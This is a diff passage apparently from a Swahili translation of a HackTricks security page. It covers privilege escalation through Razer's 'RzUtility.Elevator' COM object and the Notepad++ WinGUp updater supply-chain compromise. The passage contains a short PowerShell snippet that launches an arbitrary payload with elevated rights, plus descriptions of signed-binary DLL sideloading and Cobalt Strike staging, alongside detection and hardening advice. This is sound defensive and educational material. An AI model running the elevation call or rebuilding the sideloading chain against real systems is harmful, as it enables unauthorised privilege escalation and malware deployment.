 
 Observed exploitation path:
-- Instantiate COM object `RzUtility.Elevator`.
-- Call `LaunchProcessNoWait(<path>, "", 1)` kuomba elevated launch.
-- Kwenye public PoC, PE-signature gate ndani ya `simple_service.dll` inapatched out kabla ya kutuma request, hivyo kuruhusu arbitrary attacker-chosen executable kuzinduliwa.
+- Instantiate the COM object `RzUtility.Elevator`.
+- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
+- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.
 
 Minimal PowerShell invocation:
 ```powershell
 $com = New-Object -ComObject 'RzUtility.Elevator'
 $com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
 ```
-Hitimisho kuu: unapochambua suites za “helper”, usisimame kwenye localhost TCP au named pipes. Angalia COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha kama huduma yenye priviliji kweli huvalidi binary lengwa yenyewe au inamuaminia tu matokeo yaliyohesabiwa na patchable user-mode client DLL. Mchoro huu unatumika zaidi ya Razer: muundo wowote uliogawanywa ambapo broker ya high-privilege inapokea uamuzi wa allow/deny kutoka upande wa low-privilege ni candidate wa privesc surface.
+Takeaway ya jumla: unapochambua suites za “helper”, usiishie kwenye localhost TCP au named pipes. Angalia COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha hakikisha kama huduma yenye privileji kweli ina-validati binary lengwa yenyewe au inamwamini tu matokeo yaliyokokotolewa na user-mode client DLL inayoweza kubadilishwa. Pattern hii inaenea zaidi ya Razer: muundo wowote uliogawanywa ambapo high-privilege broker inapokea allow/deny decision kutoka upande wa low-privilege ni candidate wa privesc surface.
 
 ---
 ## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)
 
-Kati ya June 2025 na December 2025, attackers waliocompromise hosting infrastructure nyuma ya Notepad++ update flow wali-serving selectively malicious manifests kwa victims waliolengwa. Older WinGUp-based updaters hazikuthibitisha kikamilifu update authenticity, hivyo hostile XML response iliweza kuelekeza clients kwenye attacker-controlled URLs. Kwa kuwa client ilikubali HTTPS content bila kulazimisha both a trusted certificate chain na valid PE signature kwenye downloaded installer, victims walipakua na kutekeleza trojanized NSIS `update.exe`.
+Kati ya June 2025 na December 2025, attackers waliodhibiti hosting infrastructure nyuma ya Notepad++ update flow walihudumia selectively malicious manifests kwa victims waliolengwa. Older WinGUp-based updaters hazikuthibitisha kikamilifu update authenticity, hivyo hostile XML response iliweza kuelekeza clients kwenye attacker-controlled URLs. Kwa kuwa client ilikubali HTTPS content bila kutekeleza both a trusted certificate chain na valid PE signature kwenye installer iliyopakuliwa, victims walipakua na kuendesha trojanized NSIS `update.exe`.
 
 Operational flow (no local exploit required):
 1. **Infrastructure interception**: compromise CDN/hosting na jibu update checks kwa attacker metadata inayoelekeza kwenye malicious download URL.
-2. **Trojanized NSIS**: installer hupakua/huendesha payload na kutumia execution chains mbili:
-- **Bring-your-own signed binary + sideload**: bundle signed Bitdefender `BluetoothService.exe` na drop malicious `log.dll` kwenye search path yake. Wakati signed binary inapo-run, Windows sideloads `log.dll`, ambayo decrypts na reflectively loads Chrysalis backdoor (Warbird-protected + API hashing kuzuia static detection).
-- **Scripted shellcode injection**: NSIS huendesha compiled Lua script inayotumia Win32 APIs (e.g., `EnumWindowStationsW`) kuinject shellcode na stage Cobalt Strike Beacon.
+2. **Trojanized NSIS**: installer inapakua/inatekeleza payload na kutumia execution chains mawili:
+- **Bring-your-own signed binary + sideload**: bundle signed Bitdefender `BluetoothService.exe` na drop malicious `log.dll` kwenye search path yake. Wakati signed binary inaendeshwa, Windows sideloads `log.dll`, ambayo decrypts na reflectively loads Chrysalis backdoor (Warbird-protected + API hashing kuzuia static detection).
+- **Scripted shellcode injection**: NSIS inaendesha compiled Lua script inayotumia Win32 APIs (k.m. `EnumWindowStationsW`) ku-inject shellcode na stage Cobalt Strike Beacon.
 
 Hardening/detection takeaways for any auto-updater:
-- Enforce **certificate + signature verification** ya downloaded installer (pin vendor signer, reject mismatched CN/chain) na sign update manifest yenyewe (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
-- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert wakati signed vendor EXE inapoload DLL name kutoka nje ya canonical install path yake (e.g., Bitdefender loading `log.dll` from Temp/Downloads) na wakati updater inapodrop/execute installers from temp with non-vendor signatures.
-- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, na Lua-driven shellcode injection stages.
-- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na baadaye: returned XML sasa imesainiwa (XMLDSig), na newer builds enforce certificate + signature verification ya downloaded installer badala ya kuaminia transport pekee.
+- Enforce **certificate + signature verification** ya installer iliyopakuliwa (pin vendor signer, reject mismatched CN/chain) na sign update manifest yenyewe (k.m. XMLDSig). Block manifest-controlled redirects unless validated.
+- Chukulia **BYO signed binary sideloading** kama post-download detection pivot: alert wakati signed vendor EXE inapopakia DLL name kutoka nje ya canonical install path yake (k.m. Bitdefender kupakia `log.dll` kutoka Temp/Downloads) na wakati updater ina-drop/execute installers kutoka temp zenye non-vendor signatures.
+- Monitor **malware-specific artifacts** zilizoonekana kwenye chain hii (zinafaa kama generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, na Lua-driven shellcode injection stages.
+- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na baadae: returned XML sasa imesainiwa (XMLDSig), na newer builds zinatekeleza certificate + signature verification ya installer iliyopakuliwa badala ya kuamini transport pekee.
 
 <details>
 <summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
@@ -266,7 +290,7 @@ config case_sensitive = false
 ```
 </details>
 
-Mifumo hii inajumlishwa kwa updater yoyote inayokubali unsigned manifests au kushindwa ku-pin installers signers—network hijack + malicious installer + BYO-signed sideloading hutoa remote code execution chini ya kivuli cha “trusted” updates.
+Mitindo hii inajumlisha kwa updater yoyote inayokubali unsigned manifests au inashindwa kuweka pin signers za installer—network hijack + malicious installer + BYO-signed sideloading hutoa remote code execution chini ya mwavuli wa “trusted” updates.
 
 ---
 ## References
@@ -280,5 +304,7 @@ Mifumo hii inajumlishwa kwa updater yoyote inayokubali unsigned manifests au kus
 - [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
 - [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
 - [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
+- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
+- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
 
 {{#include ../../banners/hacktricks-training.md}}
